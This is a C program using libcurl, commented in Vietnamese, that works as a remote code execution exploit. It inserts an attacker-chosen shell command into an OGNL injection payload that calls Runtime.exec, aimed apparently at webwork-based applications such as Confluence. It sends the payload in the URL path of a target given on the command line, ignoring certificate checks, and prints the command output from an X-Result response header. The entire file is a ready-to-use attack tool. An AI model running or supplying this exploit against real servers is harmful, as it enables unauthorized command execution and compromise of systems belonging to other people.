#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

// Hàm callback để lấy header
size_t header_callback(char *buffer, size_t size, size_t nitems, void *userdata) {
    size_t total_size = size * nitems;
    const char *header_key = "X-Result:";
    if (strncasecmp(buffer, header_key, strlen(header_key)) == 0) {
        printf("[+] Command output (from header %s): %s", header_key, buffer + strlen(header_key));
    }
    return total_size;
}

// Hàm urlencode đơn giản
char *url_encode(const char *str) {
    CURL *curl = curl_easy_init();
    if (!curl) return NULL;
    char *output = curl_easy_escape(curl, str, 0);
    curl_easy_cleanup(curl);
    return output;
}

int main(int argc, char **argv) {
    if (argc != 3) {
        printf("Usage: %s https://target.com \"command\"\n", argv[0]);
        return 1;
    }

    const char *target = argv[1];
    const char *command = argv[2];

    char payload_template[] =
        "${(#a=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('%s').getInputStream(),'utf-8'))."
        "(@com.opensymphony.webwork.ServletActionContext@getResponse().setHeader('X-Result',#a))}";

    char payload[1024];
    snprintf(payload, sizeof(payload), payload_template, command);

    // URL encode payload
    char *payload_encoded = url_encode(payload);
    if (!payload_encoded) {
        fprintf(stderr, "Error encoding payload\n");
        return 1;
    }

    // Tạo URL đầy đủ
    char full_url[2048];
    snprintf(full_url, sizeof(full_url), "%s/%s/", target, payload_encoded);

    printf("[*] Sending exploit to: %s\n", full_url);

    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Error initializing curl\n");
        curl_free(payload_encoded);
        return 1;
    }

    curl_easy_setopt(curl, CURLOPT_URL, full_url);
    curl_easy_setopt(curl, CURLOPT_HEADERFUNCTION, header_callback);
    curl_easy_setopt(curl, CURLOPT_VERBOSE, 0L);
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);  // Bỏ qua SSL
    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);

    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) {
        fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
    }

    curl_easy_cleanup(curl);
    curl_free(payload_encoded);

    return 0;
}
